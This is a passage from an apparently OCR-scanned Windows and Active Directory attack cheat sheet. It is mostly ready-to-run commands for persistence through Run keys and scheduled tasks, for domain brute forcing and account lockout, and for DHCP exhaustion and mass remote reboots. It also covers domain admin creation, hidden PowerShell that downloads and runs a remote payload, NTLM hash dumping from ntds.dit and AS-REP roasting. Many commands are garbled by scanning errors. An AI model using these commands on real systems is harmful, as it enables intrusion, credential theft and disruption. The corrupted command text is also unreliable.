dtmu & \Opensavetmu
```

### URLs typed

```text
HKCU\Software\Microsoft\Internet Explorer\TypedURLs
```

### MRU lists

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### The last registry key used

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKeY
```

### Launch paths

```text
HKLM\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load & \Run
```

### Activation of Remote Desktop

```text
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

## Get Windows information with dsquery

### List of domain users

```text
dsquery user -limit 0
```

### List of domain groups domain=victim.com

```text
dsquery group "cn=users, dc=victim, dc=com"
```

### List of domain administrators

```text
dsquery group -name "domain admins" | dsget group -members -expand
```


### List of user groups

```text
dsquery user -name bob | dsget user -memberof -expand
```

### Get the entered user id

```text
dsquery user -name bob | dsget user -samid
```

### List of users who have not been active in the last two weeks

```text
dsquery user - inactive 2
```

### Add user

```text
dsadd user "CN=Bob,CN=Users,DC=victim,DC=com" -samid bob -pwd bobpassdisplaj
"Bob" -pwdneverexpires yes -memberof "CN=Domain
Admins,CN=Users,DC=victim,DC=com
```

### Delete user

```text
dsrm -subtree -noprornpt "CN=Bob,CN=Users,DC=victim,DC=com"
```

### List of domain operating systems

```text
dsquery A "DC=victim,DC=com" -scope subtree -attr "en" "operatingSystem"
"operatingSystemServicePack" -filter
" (& (objectclass=computer) (objectcategory=computer) (operatingSystem=Windows}
))"
```

### List of site names

```text
dsquery site -o rdn -limit 0
```

### List of all subnets in the site

```text
dsquery subnet -site sitename -o rdn
```

### List of services in the site

```text
dsquery server -site sitename -or rdn
```

### Get domain servers

```text
dsquery ' domainroot -filter
" (& (objectCategory=Computer) (objectClass=Computer) (operatingSystem='Server'
) ) "-limit 0
```

### DC list of the site

```text
dsquery "CN=Sites,CN=Configuration,DC=forestRootDomain" -filter
(objectCategory=Server)
```

## Script writing

Bash script variables must be placed in the form %%
For example %%i

### Create ping sweep

```text
for /L %i in (10,1,254) do@ (for /L %x in (10,1,254) do@ ping -n 1 -w 100
10.10.%i.%x 2 nul 1 find "Reply" && echo 10.10.%i.%x live.txt)
```

### Create a loop inside the file

```text
for /F %i in (file) do command
```

### domain brute forcer operation

```text
for /F %n in (names.txt) do for /F %pin (pawds.txt) do net use \\DC01\IPC$
/user: domain \%n %p 1 NUL 2 &1 && echo %n:%p && net use /delete
\\DCOl\IPC$ NUL
```

### account closing\(lockout.bat\)

```text
@echo Test run:
for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN-
1234\c$ /USER:%%U wrong pass
```

### DHCP exhaustion operation

```text
for /L %i
1.1.1.%i
in (2,1,254) do (netsh interface ip set address local static
netrask gw ID %1 ping 127.0.0.1 -n l -w 10000 nul %1)
```

### DNS reverse lookup process

```text
for /L %i in (100, 1, 105)
dns.txt && echo Server:
do @ nslookup 1.1.1.%i I findstr /i /c:''Name''
1.1.1.%i dns.txt
```


### Search all the paths to find the files that contain PASS and display the details of that file

```text
forfi1es /P c:\temp /s /m pass -c "cmd /c echo @isdir @fdate @ftime
@relpath @path @fsize"
```

### Malicious domain simulation \(Application for IDS test\)

```text
# Run packet capture on attack domain to receive callout
# domains.txt should contain known malicious domains
for /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n
attack domain NUL 2 &1 & ping -n 5 127.0.0.1 NUL 2 &1
```

### Operation of IE web looper (traffic generator)

```text
for /L %C in (1,1,5000) do @for %U in (www.yahoo.com www.pastebin.com
www.paypal.com www.craigslist.org www.google.com) do start /b iexplore %U &
ping -n 6 localhost & taskkill /F /IM iexplore.exe
```

### Get access to executive services

```text
for /f "tokens=2 delims='='" %a in ('wmic service list full | find /i
"pathname" I find /i /v "system32"') do @echo %a
c:\windows\temp\3afd4ga.tmp
for /f eol = " delims = " %a in (c:\windows\temp\3afd4ga.tmp) do cmd.exe
/c icacls ''%a''
```

### Spinning Reboot \(replace /R with /S to shutdown\):

```text
for /L %i in (2,1,254) do shutdown /r /m \\1.1.1.%i /f /t 0 /c "Reboot
message"
```

### Create a shell using vbs \(requires identity information\)

```text
# Create .vbs script with the following
Set shell wscript.createobject("wscript.shell")
Shell.run "runas /user: user " & """" &
C:\Windows\System32\WindowsPowershell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bjpass -nop -c \" & """" & "IEX ((New-
Object Net.WEbClieil':).downloadstring(' url '))\" & """" & """"
wscript.sleep(100)
shell.Sendkeys "password" & "{ENTER}"
```

## Scheduling the task

```text
Scheduled tasks binary paths CANNOT contain spaces because everything
after the first space in the path is considered to be a command-line
argument. Enclose the /TR path parameter between backslash (\) AND
quotation marks ("):
... /TR "\"C:\Program Files\file.exe\" -x arg1"
```

### Scheduling the task \(ST=start time, SD=start date, ED=end date\) \*need admin access

```text
SCHTASKS /CREATE /TN Task Name /SC HOURLY /ST HH:MM /F /RL HIGHEST /SD
MM/DD/YYYY /ED MM/DD/YYYY /tr "C:\my.exe" /RU DOMAIN/user /RP
password
```

### Always schedule task \[10\]

```text
For 64 bit use:
"C:\Windows\syswow64\WindowsPowerShell\vl.O\powershell.exe"
# (x86) on User Login
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object
net.webclient) .downloadstring( ''http:// ip : port I payload'''))'' /SC
onlogon /RU System
# (x86) on System Start
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object
net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
onstart /RU System
# (x86) on User Idle (30 Minutes)
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bjpass -nop -c 'IEX ((new-object
net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
onidle /i 30
```

## Instructions for working with smb

### Log in with a specific user

```text
smbclient -L 10.10.10.10 -U tlevel
```

### Login without password

```text
smbclient -N -L 10.10.10.10
```

### Change password

```text
smbpasswd -r 10.10.10.10 -U tlevel
```

### Show shared route

```text
smbclient -L 10.10.10.10
```

### Show the specified route

```text
smbclient //10.10.10.10/forensic
```

### Login to Shell

```text
smbclient //10.10.10.10/profiles$
```

### Get users along with password hash

```text
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 10.10.10.10L -usersfile
```

### Guess different smb passwords

#### with metasploit

```text
msf5 > use auxiliary/scanner/smb/smb_login
set pass_file wordlist
set USER_file users.txt
set RHOSTS 10.10.10.10
run
```

#### with medusa

```text
medusa -h 10.10.10.10 -U users.txt -P wordlist -M smbnt
```


## rpcclient commands

### entering the system

```text
rpcclient 10.10.10.10 -U support
```

### Show user information

```text
queryuser support
```

### Show users

```text
enumdomusers
```


### Show permissions

```text
enumprivs
```

### Change user access

```text
setuserinfo2 audit2020 23 'redteam'
```

### Show printers

```text
enumprinters
```

## NTLM extraction from ntds.dit file

```text
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system -
hashes lmhash:nthash LOCAL -output nt-hash
```

## Gather information using SharpHound

```text
https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
.\SharpHound.exe
or
SharpHound.exe -c All --zipfilename output.zip
```

## Gather information about Sql Server

```text
https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1
. .\PowerUpSQL.ps1
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

## Obtain AS-REP Roast hash

```text
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
.\Rubeus.exe asreproast
```

## List of available ips without using nmap

```text
for /L %i in (1,1,255) do @ping -n 1 -w 200 10.10.10.%i > nul && echo 10.10.10.%i is up.
```

Or

```text
https://github.com/sperner/PowerShell/blob/master/PortScan.ps1
.\PortScan.ps1
.\PortScan.ps1 10.10.10.10 1 10000
```

## Service identification with Test-WSMan

```text
PS> Test-WSMan -ComputerName <COMPUTERNAME> -Port 6666
```